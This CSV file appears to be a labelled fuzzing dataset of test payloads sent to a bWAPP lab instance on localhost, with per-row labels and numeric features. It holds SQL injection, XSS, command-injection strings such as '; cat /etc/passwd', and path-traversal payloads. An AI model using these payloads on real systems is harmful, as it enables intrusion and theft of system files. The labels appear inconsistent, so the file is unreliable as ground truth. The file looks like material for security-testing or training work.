label,url,param,payload,risk_level,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,<%= 7*7 %>,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,user001,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,| whoami,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,/etc/passwd,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,${7*7},high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,<body onload=alert(1)>,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,user002,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,|| whoami,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/login.php,password,0,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,user003,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,%27%20%20%20,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,0  ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,user004,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,& ping -c 1 127.0.0.1,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,0 -- ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,user005,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,& whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,{{7*7}},high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,0%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,',high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,<iframe src=javascript:alert(1)></iframe>,normal,0.0,0.0,0.003517293930053711,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,{{config}},high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/login.php,password,1,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,<img src=x onerror=alert(1)>,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,| type C:\Windows\win.ini,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,1 #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,'   ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,| whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,1 -- ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,' #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,|| whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,1%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,1' AND 1=1 #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,' AND sleep(5) --,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,"""",high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,1' AND 1=2 #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,' OR 1=1 --,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,""" OR 1=1 --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,<script>alert(1)</script>,normal,0.0,0.0,0.004137086868286133,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,2023-10-27,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,"' UNION SELECT 1,2,3,4,5 --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,${7*7},high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,; cat /etc/passwd,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,<svg/onload=alert(1)>,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,; whoami,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,%27%20%20%20,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,C:\Windows\win.ini,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,<%= 7*7 %>,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,& ping -c 1 127.0.0.1,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,`whoami`,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,<body onload=alert(1)>,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,"'""><script>alert(1)</script>",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,& whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,abc,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,') OR ('1'='1,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,',high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,../../../../../../../../etc/passwd,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,abc #,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,<iframe src=javascript:alert(1)></iframe>,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,'   ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,..\..\..\..\..\..\..\..\windows\win.ini,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,abc # -- ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,<img src=x onerror=alert(1)>,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,' #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,/etc/passwd,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,abc -- ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,0,high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,active,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,' AND sleep(5) --,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,0  ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,done,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,' OR 1=1 --,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,0 -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,hello_world,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,<script>alert(1)</script>,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,"' UNION SELECT 1,2,3,4,5 --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,0%00,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,inactive,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,1,high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,<svg/onload=alert(1)>,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,1 #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,C:\Windows\win.ini,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,1 -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,"""",high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,1%00,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,`whoami`,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,""" OR 1=1 --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,1' AND 1=1 #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,${7*7},high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,abc,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,1' AND 1=2 #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,%27%20%20%20,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,abc #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,2023-10-27,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,& ping -c 1 127.0.0.1,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,"'""><script>alert(1)</script>",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,javascript:alert(1),normal,0.0,0.0,0.0105072021484375,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,; cat /etc/passwd,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,abc # -- ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,& whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,') OR ('1'='1,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,; whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,',high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,abc -- ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,../../../../../../../../etc/passwd,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,<%= 7*7 %>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,'   ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,active,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,<body onload=alert(1)>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,normaltext,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,..\..\..\..\..\..\..\..\windows\win.ini,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,' #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,done,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,ok,normal,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,/etc/passwd,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,php://filter/convert.base64-encode/resource=index.php,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,0,high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,hello_world,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,' AND sleep(5) --,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,random_user_name,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,0  ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,' OR 1=1 --,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,ready,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,inactive,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,0 -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,<iframe src=javascript:alert(1)></iframe>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/csrf_1.php,password_new,"' UNION SELECT 1,2,3,4,5 --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,sample_input,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,0%00,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,<img src=x onerror=alert(1)>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,test12345,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,1,high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,test_safe_string,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,1 #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,test_safe_string ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,1 -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,test_safe_string    ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,1%00,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,javascript:alert(1),high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,test_safe_string    %00,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,1' AND 1=1 #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,normaltext,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,1' AND 1=2 #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,user001,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,ok,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,password,2023-10-27,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
